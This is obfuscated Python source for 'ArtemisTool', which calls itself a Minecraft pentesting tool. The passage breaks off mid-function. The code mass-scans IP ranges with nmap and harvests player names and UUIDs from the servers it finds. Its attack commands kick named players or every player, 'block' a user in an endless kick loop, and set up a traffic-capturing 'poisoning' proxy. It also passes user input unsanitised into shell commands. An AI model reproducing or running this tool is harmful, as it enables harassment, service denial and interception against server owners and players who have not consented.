import hashlib #line:11
import os #line:12
import sys #line:13
import time #line:14
import requests #line:15
import json #line:16
import re #line:17
import socket #line:18
import uuid #line:19
import subprocess #line:20
import shutil #line:21
import base64 #line:22
import traceback #line:23
from config .files .mc_replace_text import mc_replace_text_mccolors ,mc_replace_text_json #line:25
from config .files .questions import skip_0on ,specific_name ,specific_version #line:26
from config .files .checks_mcptool import check_node ,check_server ,check_encoding ,check_java ,check_file ,check_folder ,check_nmap ,check_port ,check_qubo ,check_ngrok ,check_updates ,check_nmap_error ,motd_1 ,motd_2 ,motd_3 #line:27
from mcstatus import MinecraftServer #line:28
from datetime import datetime #line:29
from colorama import Fore ,init #line:30
from json import JSONDecodeError #line:31
init ()#line:34
DEBUG =False #line:38
SKIP_LOAD =False #line:39
red =Fore .RED #line:43
lred =Fore .LIGHTRED_EX #line:44
black =Fore .BLACK #line:45
lblack =Fore .LIGHTBLACK_EX #line:46
white =Fore .WHITE #line:47
lwhite =Fore .LIGHTWHITE_EX #line:48
green =Fore .GREEN #line:49
lgreen =Fore .LIGHTGREEN_EX #line:50
cyan =Fore .CYAN #line:51
lcyan =Fore .LIGHTCYAN_EX #line:52
magenta =Fore .MAGENTA #line:53
lmagenta =Fore .LIGHTMAGENTA_EX #line:54
yellow =Fore .YELLOW #line:55
lyellow =Fore .LIGHTYELLOW_EX #line:56
blue =Fore .BLUE #line:57
lblue =Fore .LIGHTBLUE_EX #line:58
reset =Fore .RESET #line:59
mojang_api ="https://api.mojang.com/users/profiles/minecraft/"#line:63
mcsrvstat_api ="https://api.mcsrvstat.us/2/"#line:64
animation =r"|/-\\"#line:68
animation1 =".."#line:69
host_list =["minehost","holyhosting","vultam"]#line:73
script__version ="2.3"#line:74
number_of_servers =0 #line:75
version_link ="https://raw.hubusercontent.com/wrrulos/MCPTool/main/config/data/version"#line:76
discord_link ="discord.gg/x3sKFzeqd5"#line:77
bot_connect =""#line:78
py =""#line:79
sfile =False #line:80
banner =rf""" 
{lred}            .-***-.          
{lred}           '       \     ,**************.
{lred}          |,.  ,-.  |    | Linux Rules! |
{lred}          |()L( ()| |   _;..............'
{lred}          |,'  `".| | -'                 {lred}    _       _             _    _____         _ 
{lred}          |.___.',| `                    {lred}   /_\  _ _| |_ ___ _ __ (_)__|_   _|__  ___| |  {lred}Discord: {white}Nowze'#0001
{lred}         .j `--** `  `.                  {lred}  / _ \| '_|  _/ -_) '  \| (_-< | |/ _ \/ _ \ |  {lred}Github:  {white}@nowze
{white}        / '        *   \                  {lred}/_/ \_\_|  \__\___|_|_|_|_/__/ |_|\___/\___/_|
{white}       / /          `   `.                   {white}                                             {lred}Minecraft Pentesting Tool {lgreen}v0.1{green}
{white}      / /            `    .
{white}     / /              l   |                 
{white}    . ,               |   |              Do you want to join my discord? Use discord command
{white}    ,"`.             .|   |
{white} _.'   ``.          | `..-'l
{white}|       `.`,        |      `.
{white}|         `.    __.j         )
{white}|__        |--**___|      ,-'
{white}   `*--____-****   *._,.-' mh

"""#line:102
banner_2 =rf"""
{lred}    _       _             _    _____         _ 
{lred}   /_\  _ _| |_ ___ _ __ (_)__|_   _|__  ___| |{lred}Discord: {white}Nowze'#0001
{lred}  / _ \| '_|  _/ -_) '  \| (_-< | |/ _ \/ _ \ |  {lred}Github: {white}@nowze
{white}/_/ \_\_|  \__\___|_|_|_|_/__/ |_|\___/\___/_|
{white}                                             {lred}Minecraft Pentesting Tool {lgreen}v0.1{green}
"""#line:110
loading_banner =rf"""





                                         {lred}            .-***-.                                   
                                         {lred}           '       \     ,**************.
                                         {lred}          |,.  ,-.  |    | Linux Rules! |
                                         {lred}          |()L( ()| |   _;..............'
                                         {lred}          |,'  `".| | -'                 
                                         {lred}          |.___.',| `                    
                                         {lred}         .j `--** `  `.                  
                                         {white}        / '        *   \                  
                                         {white}       / /          `   `.                           
                                         {white}      / /            `    .
                                         {white}     / /              l   |                 
                                         {white}    . ,               |   |              
                                         {white}    ,"`.             .|   |
                                         {white} _.'   ``.          | `..-'l
                                         {white}|       `.`,        |      `.
                                         {white}|         `.    __.j         )
                                         {white}|__        |--**___|      ,-'
                                         {white}   `*--____-****   *._,.-' mh{reset}

"""#line:137
help_message =f"""
     ╔══════════════════════════════════╦═══════════════════════════════════════╗                          
     ║  Command categories              ║             Description               ║
     ║                                  ║                                       ║
     ║  ► Scanners                      ║                                       ║
     ║                                  ║                                       ║
     ║    • scan [ip]                   ║  Scan the ports of an IP.             ║
     ║    • qubo [ip] [ports] [th] [ti] ║  Scan the IP using quboscanner.       ║
     ║    • host [host] [ports]         ║  Scans the nodes of a host.           ║
     ║    • checker [file]              ║  Check the servers of a file.         ║
     ║    • sfile [file] [ports]        ║  Scan a list of ips addresses         ║
     ║                                  ║  from a file.                         ║
     ║  ► Information                   ║                                       ║
     ║                                  ║                                       ║
     ║    • server [ip]                 ║  Displays information about a server. ║
     ║    • player [name]               ║  Displays information about a player. ║
     ║    • mods [ip:port]              ║  Show mods on this server.            ║
     ║    • listening [ip:port]         ║  Get the names of the users from the  ║
     ║                                  ║  server.                              ║
     ║  ► Attacking                     ║                                       ║
     ║                                  ║                                       ║
     ║    • kick [ip:port] [name]       ║  Kick a player from the server        ║
     ║    • kickall [ip:port]           ║  Kick all players from the server     ║
     ║    • block [ip:port] [name]      ║  Kick a player from the server        ║ 
     ║                                  ║  without stopping (infinite loop)     ║
     ║    • poisoning [ip] [local-port] ║  Create a proxy connection that       ║
     ║                                  ║  redirects to a server and captures   ║
     ║  ► Others                        ║                                       ║
     ║                                  ║                                       ║
     ║    • discord                     ║  Show my server link.                 ║
     ║    • discordip                   ║  Show all voice chat connected ip.    ║
     ║    • clear                       ║  Clean the screen.                    ║
     ║    • bungee [ip:port]            ║  Start a proxy server.                ║
     ║    • bot [ip:port]               ║  Connect to a server using a bot.     ║
     ║                                  ║                                       ║
     ╚══════════════════════════════════╩═══════════════════════════════════════╝"""#line:173
def connect (O0O00O0000OO000OO ,O00OO00000OOOOO0O ,O0OOO000OO00OOO00 ,O0000OO000OOOOO00 ,O0OOO0O0000OO0O0O ):#line:178
    ""#line:179
    OO00O00O0000OO0O0 =False #line:180
    if O0O00O0000OO000OO =="connect":#line:182
        print (py )#line:183
        os .system ("cls || clear")#line:184
        print (banner_2 ,white )#line:185
        if O0000OO000OOOOO00 is None :#line:187
            if O0OOO0O0000OO0O0O is None :#line:188
                print ("a")#line:189
                os .system (f"{py} config/files/RBot.py -host {O00OO00000OOOOO0O} -p {O0OOO000OO00OOO00} -m connect")#line:190
            else :#line:192
                os .system (f"{py} config/files/RBot.py -host {O00OO00000OOOOO0O} -p {O0OOO000OO00OOO00} -n {O0OOO0O0000OO0O0O} -m connect")#line:193
        else :#line:194
            if O0OOO0O0000OO0O0O is None :#line:195
                os .system (f"{py} config/files/RBot.py -host {O00OO00000OOOOO0O} -p {O0OOO000OO00OOO00} -v {O0000OO000OOOOO00} -m connect")#line:196
            else :#line:198
                os .system (f"{py} config/files/RBot.py -host {O00OO00000OOOOO0O} -p {O0OOO000OO00OOO00} -n {O0OOO0O0000OO0O0O} -v {O0000OO000OOOOO00} -m connect")#line:199
        print (f"\n{lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:201
        time .sleep (3 )#line:202
    elif O0O00O0000OO000OO =="check":#line:204
        OO00O000O0OO00OOO =subprocess .run (f"{py} config/files/RBot.py -host {O00OO00000OOOOO0O} -p {O0OOO000OO00OOO00} -m check -mcptool",stdout =subprocess .PIPE )#line:205
        OO00O000O0OO00OOO =mc_replace_text_json (str (OO00O000O0OO00OOO .stdout .decode ('utf-8')))#line:206
        OO00O000O0OO00OOO =mc_replace_text_mccolors (OO00O000O0OO00OOO )#line:207
        OO00O000O0OO00OOO =OO00O000O0OO00OOO .replace ("b'","").replace ("\r","").replace ("\n","").replace ("'","")#line:208
        if OO00O000O0OO00OOO =="Timeout":#line:210
            print (f"     {lblack}[{lred}CONN{white}ECT{lblack}] {lred}Timeout")#line:211
        elif OO00O000O0OO00OOO =="OK":#line:213
            print (f"     {lblack}[{lred}CONN{white}ECT{lblack}] {lgreen}Connected")#line:214
        else :#line:216
            print (f"     {lblack}[{lred}CONN{white}ECT{lblack}] {white}{OO00O000O0OO00OOO}")#line:217
    elif O0O00O0000OO000OO =="kick":#line:219
        print ("")#line:220
        OO00O000O0OO00OOO =subprocess .run (f"{py} config/files/RBot.py -host {O00OO00000OOOOO0O} -p {O0OOO000OO00OOO00} -m kick -mcptool -v {O0000OO000OOOOO00} -n {O0OOO0O0000OO0O0O}",stdout =subprocess .PIPE )#line:221
        if "Kicking the player"in str (OO00O000O0OO00OOO .stdout .decode ('utf-8')):#line:222
            print (f"     {lblack}[{lred}KI{white}CK{lblack}] {white}Kicking the player {lgreen}{O0OOO0O0000OO0O0O}{white}")#line:223
            return #line:224
        OO00O000O0OO00OOO =mc_replace_text_json (str (OO00O000O0OO00OOO .stdout .decode ('utf-8')))#line:226
        OO00O000O0OO00OOO =mc_replace_text_mccolors (OO00O000O0OO00OOO )#line:227
        OO00O000O0OO00OOO =OO00O000O0OO00OOO .replace ("b'","").replace ("\r","").replace ("\n","").replace ("'","")#line:228
        print (f"     {lblack}[{lred}ERR{white}OR{lblack}] {white}{OO00O000O0OO00OOO}")#line:229
    elif O0O00O0000OO000OO =="kickall":#line:231
        try :#line:232
            O00O00O0000OO00O0 =get_players (f"{O00OO00000OOOOO0O}:{O0OOO000OO00OOO00}")#line:233
            if not len (O00O00O0000OO00O0 )==0 :#line:234
                print ("")#line:235
                for O000OO0O0O0OOOOO0 in O00O00O0000OO00O0 :#line:236
                    if not O000OO0O0O0OOOOO0 =="Anonymous Player":#line:237
                        if not " "in O000OO0O0O0OOOOO0 :#line:238
                            if OO00O00O0000OO0O0 :#line:239
                                time .sleep (5 )#line:240
                            OO00O000O0OO00OOO =subprocess .run (f"{py} config/files/RBot.py -host {O00OO00000OOOOO0O} -p {O0OOO000OO00OOO00} -m kickall-mcptool -mcptool -v {O0000OO000OOOOO00} -n {O000OO0O0O0OOOOO0}",stdout =subprocess .PIPE )#line:241
                            if "Kicking the player"in str (OO00O000O0OO00OOO .stdout .decode ('utf-8')):#line:242
                                print (f"     {lblack}[{lred}KI{white}CK{lblack}] {white}Kicking the player {lgreen}{O000OO0O0O0OOOOO0}{white}")#line:244
                                return #line:245
                            OO00O000O0OO00OOO =mc_replace_text_json (str (OO00O000O0OO00OOO .stdout .decode ('utf-8')))#line:247
                            OO00O000O0OO00OOO =mc_replace_text_mccolors (OO00O000O0OO00OOO )#line:248
                            OO00O000O0OO00OOO =OO00O000O0OO00OOO .replace ("b'","").replace ("\r","").replace ("\n","").replace ("'","")#line:249
                            print (f"     {lblack}[{lred}ERR{white}OR{lblack}] {white}{OO00O000O0OO00OOO}")#line:250
                            OO00O00O0000OO0O0 =True #line:251
                print (f"\n     {lblack}[{lred}FINI{white}SHED{lblack}] {white}All players have been kicked from the server!")#line:253
            else :#line:255
                print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}There are no players connected.")#line:256
        except KeyboardInterrupt :#line:258
            print (f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:259
            return #line:260
    elif O0O00O0000OO000OO =="block":#line:262
        print (f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Blocking user Rulo...")#line:263
        while True :#line:264
            try :#line:265
                subprocess .run (f"{py} config/files/RBot.py -host {O00OO00000OOOOO0O} -p {O0OOO000OO00OOO00} -m block -mcptool -v {O0000OO000OOOOO00} -n {O0OOO0O0000OO0O0O}",stdout =subprocess .PIPE )#line:266
                time .sleep (3 )#line:267
            except KeyboardInterrupt :#line:269
                print (f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:270
                break #line:271
def load ():#line:274
    ""#line:275
    try :#line:276
        os .system ("cls || clear")#line:277
        print (loading_banner ,"\n                                              Checking for updates.",end ="")#line:278
        time .sleep (0.4 )#line:279
        for _OO00O00OOO0O000O0 in animation1 :#line:281
            print (_OO00O00OOO0O000O0 ,end ="")#line:282
            time .sleep (0.4 )#line:283
        OOOO0OO0O00OO0OO0 =check_updates ()#line:285
        if OOOO0OO0O00OO0OO0 :#line:287
            os .system ("cls || clear")#line:288
            print (loading_banner ,f"\n                                          {lgreen}Nouvelle version disponible sur mon github.\n\n{white}                                                https://github.com/nowze/\n\n")#line:289
            time .sleep (1 )#line:290
            print (f"{white}                                        Démarrage ArtemisTool avec la version actuelle")#line:291
            time .sleep (2 )#line:292
            return #line:293
        os .system ("cls || clear")#line:295
        print (loading_banner ,f"\n                                          {white}Tu utilise la dernière version!")#line:296
        time .sleep (2 )#line:297
        return #line:298
    except :#line:300
        pass #line:301
def save_logs (O00O0O0OO0OOOOO00 ,OO0OO000OOO0O0OO0 ,OOOO00OOOO00O0OOO ,OO00OOOOO00OOOO00 ,O00O0OO0OOO00OOOO ):#line:304
    ""#line:305
    O00OOOO00O0O0OOOO =datetime .now ()#line:306
    OO0O0OO0OOOOOOO00 =f"{OO0OO000OOO0O0OO0}_{str(O00OOOO00O0O0OOOO.day)}-{str(O00OOOO00O0O0OOOO.month)}-{str(O00OOOO00O0O0OOOO.year)}_{str(O00OOOO00O0O0OOOO.hour)}.{str(O00OOOO00O0O0OOOO.minute)}.{str(O00OOOO00O0O0OOOO.second)}.txt"#line:308
    OOO0000000O0O00O0 =open (OO0O0OO0OOOOOOO00 ,"w",encoding ="utf8")#line:309
    OOO0000000O0O00O0 .write (f"##################\n# {OOOO00OOOO00O0OOO} #\n##################\n\n")#line:310
    OOO0000000O0O00O0 .write (f"[DATE] {str(O00OOOO00O0O0OOOO.year)}-{str(O00OOOO00O0O0OOOO.month)}-{str(O00OOOO00O0O0OOOO.day)}\n[HOUR] {str(O00OOOO00O0O0OOOO.hour)}.{str(O00OOOO00O0O0OOOO.minute)}.{str(O00OOOO00O0O0OOOO.second)}\n[{OO00OOOOO00OOOO00}] {str(O00O0O0OO0OOOOO00)}\n\n")#line:311
    OOO0000000O0O00O0 .write (f"{O00O0OO0OOO00OOOO}: \n")#line:312
    OOO0000000O0O00O0 .close ()#line:313
    return OO0O0OO0OOOOOOO00 #line:314
def nmap_scan (OOOO0O000OO0OOO00 ,O00O0OOO0000OO000 ,O000OOOO0OOO00OOO ,OOO0OOOOOOOOOOO00 ,OO0O00OOO0OO0OOO0 ):#line:317
    ""#line:318
    check_folder ("results")#line:319
    O000OOO0O0000000O =datetime .now ()#line:320
    OOO0OO000O000O000 =f"temp_scan_{str(O000OOO0O0000000O.day)}-{str(O000OOO0O0000000O.month)}-{str(O000OOO0O0000000O.year)}_{str(O000OOO0O0000000O.hour)}.{str(O000OOO0O0000000O.minute)}.{str(O000OOO0O0000000O.second)}.txt"#line:321
    if not OOOO0O000OO0OOO00 =="host":#line:323
        if not sfile :#line:324
            check_folder ("results/scan")#line:325
            os .system ("cls || clear")#line:326
            print (banner ,f"\n     {lblack}[{lred}SCAN{white}NER{lblack}] {white}Scanning {green}{O00O0OOO0000OO000}{white}.. \n\n     {white}[{lcyan}INFO{white}] {white}Remember that you cannot have the vpn activated to scan!")#line:327
    try :#line:329
        os .system (f"nmap -p {str(O000OOOO0OOO00OOO)} -T5 -Pn -v -oN {OOO0OO000O000O000} {str(O00O0OOO0000OO000)} >nul 2>&1")#line:330
    except KeyboardInterrupt :#line:332
        os .remove (OOO0OO000O000O000 )#line:333
    O0OO00OO0O00O000O =check_nmap_error (OOO0OO000O000O000 ,O00O0OOO0000OO000 )#line:335
    if not O0OO00OO0O00O000O =="None":#line:337
        return #line:338
    if not OOOO0O000OO0OOO00 =="host":#line:340
        OO0O00OOO0OO0OOO0 =save_logs (O00O0OOO0000OO000 ,"results/scan/scan","SCAN LOGS","TARGET","Servers found")#line:341
    O00000O0O00O0OOO0 =datetime .now ()#line:343
    OO0O00O0O0O0OOO00 =f"temp_scan_ips_list_{str(O00000O0O00O0OOO0.day)}-{str(O00000O0O00O0OOO0.month)}-{str(O00000O0O00O0OOO0.year)}_{str(O00000O0O00O0OOO0.hour)}.{str(O00000O0O00O0OOO0.minute)}.{str(O00000O0O00O0OOO0.second)}.txt"#line:344
    O00OO0O00OOOO0OO0 =open (OO0O00O0O0O0OOO00 ,"w+")#line:345
    with open (OOO0OO000O000O000 ,encoding ="utf8")as OO00O00O0OOOOOOOO :#line:347
        for OOOOO0O00OOO0O0OO in OO00O00O0OOOOOOOO :#line:348
            OO00OOOOOO0O0OOOO =re .findall ("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",OOOOO0O00OOO0O0OO )#line:349
            OO00OOOOOO0O0OOOO =" ".join (OO00OOOOOO0O0OOOO )#line:350
            OO00OOOOOO0O0OOOO =OO00OOOOOO0O0OOOO .replace ("(","").replace (")","")#line:351
            O0000000OO0O000OO =re .findall ("\d{1,5}\/tcp open",OOOOO0O00OOO0O0OO )#line:352
            O0000000OO0O000OO =" ".join (O0000000OO0O000OO )#line:353
            if "."in OO00OOOOOO0O0OOOO :#line:355
                OOO00OO00O00O0000 =OO00OOOOOO0O0OOOO #line:356
            if "tcp"in O0000000OO0O000OO :#line:358
                O0000000OO0O000OO =O0000000OO0O000OO .replace ("/tcp open","")#line:359
                OO0OO00O000OO00OO =OOO00OO00O00O0000 #line:360
                try :#line:362
                    OOO00OO00O00O0000 =OOO00OO00O00O0000 .split (" ")#line:363
                    OOO00OO00O00O0000 =OOO00OO00O00O0000 [1 ]#line:364
                except :#line:366
                    OOO00OO00O00O0000 =OO0OO00O000OO00OO #line:367
                O00OO0O00OOOO0OO0 .write (f"{OOO00OO00O00O0000}:{O0000000OO0O000OO}\n")#line:369
        O00OO0O00OOOO0OO0 .close ()#line:371
    with open (OO0O00O0O0O0OOO00 )as O00OO0O00OOOO0OO0 :#line:373
        for OOOOO0O00OOO0O0OO in O00OO0O00OOOO0OO0 :#line:374
            OOOOO0O00OOO0O0OO =OOOOO0O00OOO0O0OO .replace ("\n","")#line:375
            try :#line:376
                get_server (OOOOO0O00OOO0O0OO ,OOO0OOOOOOOOOOO00 ,OO0O00OOO0OO0OOO0 )#line:377
            except :#line:379
                pass #line:380
    os .remove (OOO0OO000O000O000 )#line:382
    os .remove (OO0O00O0O0O0OOO00 )#line:383
def get_server (O0OOO0OOO0O00OO0O ,OOO0OO00OOO0O0OOO ,O000O0OO00000O00O ):#line:386
    ""#line:387
    global number_of_servers #line:388
    try :#line:390
        O000O00O0000OOO0O =None #line:391
        OO00O0OOO000OO00O =MinecraftServer .lookup (O0OOO0OOO0O00OO0O )#line:392
        O0OOOO0O0O00O0O0O =OO00O0OOO000OO00O .status ()#line:394
        OO0O00OO000O0OOOO =mc_replace_text_mccolors (O0OOOO0O0O00O0O0O .description )#line:395
        OOO000O00000O000O =O0OOOO0O0O00O0O0O .description .replace ('§1','').replace ('§2','').replace ('§3','').replace ('§4','').replace ('§5','').replace ('§6','').replace ('§7','').replace ('§8','').replace ('§9','').replace ('§0','').replace ('§a','').replace ('§b','').replace ('§c','').replace ('§d','').replace ('§e','').replace ('§f','').replace ('§k','').replace ('§l','').replace ('§m','').replace ('§n','').replace ('§o','').replace ('§r','').replace ('\n','')#line:396
        OOO000O00000O000O =re .sub (" +"," ",OOO000O00000O000O )#line:397
        OOOOOO00O000000OO =mc_replace_text_mccolors (O0OOOO0O0O00O0O0O .version .name )#line:398
        O000OOOO0OOO0O0O0 =O0OOOO0O0O00O0O0O .version .name .replace ('§1','').replace ('§2','').replace ('§3','').replace ('§4','').replace ('§5','').replace ('§6','').replace ('§7','').replace ('§8','').replace ('§9','').replace ('§0','').replace ('§a','').replace ('§b','').replace ('§c','').replace ('§d','').replace ('§e','').replace ('§f','').replace ('§k','').replace ('§l','').replace ('§m','').replace ('§n','').replace ('§o','').replace ('§r','').replace ('\n','')#line:399
        O000OOOO0OOO0O0O0 =re .sub (" +"," ",O000OOOO0OOO0O0O0 )#line:400
        if O0OOOO0O0O00O0O0O .players .sample is not None :#line:402
            O000O00O0000OOO0O =str ([f"{O0O00O00O00O0OOOO.name} ({O0O00O00O00O0OOOO.id})"for O0O00O00O00O0OOOO in O0OOOO0O0O00O0O0O .players .sample ])#line:403
            O000O00O0000OOO0O =O000O00O0000OOO0O .replace ("[","").replace ("]","").replace ("'","")#line:404
        if OOO0OO00OOO0O0OOO :#line:406
            if not str (O0OOOO0O0O00O0O0O .players .online )=="0":#line:407
                pass #line:408
            else :#line:410
                return #line:411
        print (f"\n     {lblack}[{lred}I{white}P{lblack}] {white}{O0OOO0OOO0O00OO0O}")#line:413
        print (f"     {lblack}[{lred}MO{white}TD{lblack}] {white}{OO0O00OO000O0OOOO}")#line:414
        print (f"     {lblack}[{lred}Ver{white}sion{lblack}] {white}{OOOOOO00O000000OO}")#line:415
        print (f"     {lblack}[{lred}Proto{white}col{lblack}] {white}{O0OOOO0O0O00O0O0O.version.protocol}")#line:416
        print (f"     {lblack}[{lred}Play{white}ers{lblack}] {white}{O0OOOO0O0O00O0O0O.players.online}{lblack}/{white}{O0OOOO0O0O00O0O0O.players.max}")#line:417
        if bot_connect :#line:419
            OO0OOOOOOOOO0000O =O0OOO0OOO0O00OO0O .split (":")#line:420
            connect ("check",OO0OOOOOOOOO0000O [0 ],OO0OOOOOOOOO0000O [1 ],None ,None )#line:421
        with open (O000O0OO00000O00O ,"a",encoding ="utf8")as OO0O000O00000000O :#line:423
            OO0O000O00000000O .write (f"\n\n[IP] {O0OOO0OOO0O00OO0O}")#line:424
            OO0O000O00000000O .write (f"\n[MOTD] {OOO000O00000O000O}")#line:425
            OO0O000O00000000O .write (f"\n[Version] {O000OOOO0OOO0O0O0}")#line:426
            OO0O000O00000000O .write (f"\n[Protocol] {O0OOOO0O0O00O0O0O.version.protocol}")#line:427
            OO0O000O00000000O .write (f"\n[Players] {O0OOOO0O0O00O0O0O.players.online}/{O0OOOO0O0O00O0O0O.players.max}")#line:428
        if O0OOOO0O0O00O0O0O .players .sample is not None :#line:430
            if O000O00O0000OOO0O !="":#line:431
                try :#line:432
                    re .findall (r"[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z]-[0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z][0-9a-z]",O000O00O0000OOO0O )#line:433
                    if "00000000-0000-0000-0000-000000000000"not in O000O00O0000OOO0O :#line:434
                        print (f"     {lblack}[{lred}Nam{white}es{lblack}] {white}{O000O00O0000OOO0O}")#line:435
                        with open (O000O0OO00000O00O ,"a")as OO0O000O00000000O :#line:436
                            OO0O000O00000000O .write (f"\n[Names] {O000O00O0000OOO0O}")#line:437
                except :#line:439
                    pass #line:440
        number_of_servers +=1 #line:442
    except :#line:444
        pass #line:445
def get_ngrok_ip ():#line:448
    ""#line:449
    O0OOOO000O000O0OO =requests .get ("http://localhost:4040/api/tunnels")#line:450
    O0O0OOOO0OO000OO0 =O0OOOO000O000O0OO .content .decode ("utf-8")#line:451
    O0OOOOO0O0OOOO0OO =json .loads (O0O0OOOO0OO000OO0 )#line:452
    O0OO000O0O0OO00O0 =O0OOOOO0O0OOOO0OO ["tunnels"][0 ]["public_url"]#line:453
    OO00OO00O0000O00O =O0OO000O0O0OO00O0 .replace ("tcp://","")#line:454
    OO00OO00O0000O00O =OO00OO00O0000O00O .split (":")#line:455
    O0O0OOOOOO00O00OO =socket .gethostbyname (str (OO00OO00O0000O00O [0 ]))#line:456
    O00000OO000O00000 =O0O0OOOOOO00O00OO +":"+OO00OO00O0000O00O [1 ]#line:457
    return O00000OO000O00000 #line:458
def get_port (OOO000000O00000OO ):#line:461
    ""#line:462
    if ":"in OOO000000O00000OO :#line:463
        OOO00O0OO0OOO0O00 =OOO000000O00000OO .split (":")#line:464
        return OOO00O0OO0OOO0O00 [1 ]#line:465
    try :#line:467
        OOOOOOO00OOO0OOOO =requests .get (f"{mcsrvstat_api}{OOO000000O00000OO}")#line:468
        O0O0O000O0O0O0000 =OOOOOOO00OOO0OOOO .json ()#line:469
        OOOO00O0OO00OO00O =O0O0O000O0O0O0000 ["port"]#line:470
        return OOOO00O0OO00OO00O #line:471
    except :#line:473
        return None #line:474
def get_players (OOOOOO000O00OO000 ):#line:477
    ""#line:478
    try :#line:479
        O00OOOOOO000OOO00 =MinecraftServer .lookup (OOOOOO000O00OO000 )#line:480
        O0000OO000OO0O000 =O00OOOOOO000OOO00 .status ()#line:481
        OO0O0OOOOO0OO0O00 =[]#line:482
        if O0000OO000OO0O000 .players .sample is not None :#line:483
            for OO0000OO0000OOOOO in O0000OO000OO0O000 .players .sample :#line:484
                if OO0000OO0000OOOOO .name !="":#line:485
                    OO0O0OOOOO0OO0O00 .append (OO0000OO0000OOOOO .name )#line:486
        return OO0O0OOOOO0OO0O00 #line:488
    except :#line:490
        pass #line:491
def bot_check ():#line:494
    global bot_connect #line:495
    while True :#line:497
        O000OOOOO0O000OO0 =input ("\n     Do you want a bot to check if the server can be entered? yes/no -> ")#line:498
        if O000OOOOO0O000OO0 .lower ()=="y"or O000OOOOO0O000OO0 .lower ()=="yes":#line:500
            bot_connect =True #line:501
            return #line:502
        elif O000OOOOO0O000OO0 .lower ()=="n"or O000OOOOO0O000OO0 .lower ()=="no":#line:504
            bot_connect =False #line:505
            return #line:506
        else :#line:508
            continue #line:509
def iplist (O0OOO00OOO0O0O0OO ):#line:512
    try :#line:513
        O00OOOO00OOOO00OO =[]#line:514
        O000000O00O00000O =open (O0OOO00OOO0O0O0OO ,"r+")#line:515
        O0OO0OOO00O0O0O00 =O000000O00O00000O .readlines ()#line:516
        for OO0O00OO0000O0O0O in O0OO0OOO00O0O0O00 :#line:518
            try :#line:519
                OO0O00OO0000O0O0O =OO0O00OO0000O0O0O .replace ("\n","")#line:520
            except :#line:522
                pass #line:523
            try :#line:525
                socket .inet_aton (OO0O00OO0000O0O0O )#line:526
                O00OOOO00OOOO00OO .append (OO0O00OO0000O0O0O )#line:527
            except :#line:529
                pass #line:530
        if len (O00OOOO00OOOO00OO )==0 :#line:532
            print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}No ip addresses found in the file.")#line:533
            return False ,O00OOOO00OOOO00OO #line:534
        return True ,O00OOOO00OOOO00OO #line:536
    except FileNotFoundError :#line:538
        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}File not found.")#line:539
        return False ,None #line:540
def checker_command (O0000O0O000OO0000 ,OO000OO0O000OO000 ):#line:546
    ""#line:547
    O0OOOO0OO0O0000OO =0 #line:548
    try :#line:550
        OOO000OOOO0O0O000 =check_encoding (O0000O0O000OO0000 )#line:551
        OO00O0O00OO000OO0 =open (O0000O0O000OO0000 ,"r+",encoding =OOO000OOOO0O0O000 )#line:552
        check_folder ("results")#line:553
        check_folder ("results/checker")#line:554
        O00OOO0O0O0OOO00O =save_logs (O0000O0O000OO0000 ,"results/checker/checker","CHECKER LOGS","FILE","Servers found")#line:555
        os .system ("cls || clear")#line:556
        print (banner ,f"\n     {lblack}[{lred}CHE{white}CKER{lblack}] {white}Checking the file..")#line:558
        if "Nmap done at"in OO00O0O00OO000OO0 .read ():#line:560
            OO00O0O00OO000OO0 .close ()#line:561
            with open (O0000O0O000OO0000 ,encoding =OOO000OOOO0O0O000 )as OOO0000OO0O0000O0 :#line:562
                for OO0OOOO000O00000O in OOO0000OO0O0000O0 :#line:563
                    O0O000000OO0OOOO0 =re .findall ("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",OO0OOOO000O00000O )#line:564
                    O0O000000OO0OOOO0 =" ".join (O0O000000OO0OOOO0 )#line:565
                    O0O000000OO0OOOO0 =O0O000000OO0OOOO0 .replace ("(","").replace (")","")#line:566
                    OOOOO0O0000OO0O0O =re .findall ("\d{1,5}\/tcp open",OO0OOOO000O00000O )#line:567
                    OOOOO0O0000OO0O0O =" ".join (OOOOO0O0000OO0O0O )#line:568
                    if "."in O0O000000OO0OOOO0 :#line:570
                        OOOO000OOO0000OOO =O0O000000OO0OOOO0 #line:571
                    if "tcp"in OOOOO0O0000OO0O0O :#line:573
                        OOOOO0O0000OO0O0O =OOOOO0O0000OO0O0O .replace ("/tcp open","")#line:574
                        O0O000OO0O00OO0O0 =OOOO000OOO0000OOO #line:575
                        try :#line:577
                            OOOO000OOO0000OOO =OOOO000OOO0000OOO .split (" ")#line:578
                            OOOO000OOO0000OOO =OOOO000OOO0000OOO [1 ]#line:579
                        except :#line:581
                            OOOO000OOO0000OOO =O0O000OO0O00OO0O0 #line:582
                        O0OOOO0OO0O0000OO +=1 #line:584
                        get_server (f"{OOOO000OOO0000OOO}:{OOOOO0O0000OO0O0O}",OO000OO0O000OO000 ,O00OOO0O0O0OOO00O )#line:585
            return #line:587
        with open (O0000O0O000OO0000 ,encoding =OOO000OOOO0O0O000 )as OOOOOOO00O0OO0O0O :#line:589
            for OO0OOOO000O00000O in OOOOOOO00O0OO0O0O :#line:590
                O0O000000OO0OOOO0 =re .findall ("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}",OO0OOOO000O00000O )#line:591
                O0O000000OO0OOOO0 =" ".join (O0O000000OO0OOOO0 )#line:592
                if ":"in O0O000000OO0OOOO0 :#line:593
                    O0OOOO0OO0O0000OO +=1 #line:594
                    get_server (O0O000000OO0OOOO0 ,OO000OO0O000OO000 ,O00OOO0O0O0OOO00O )#line:595
        if O0OOOO0OO0O0000OO ==0 :#line:597
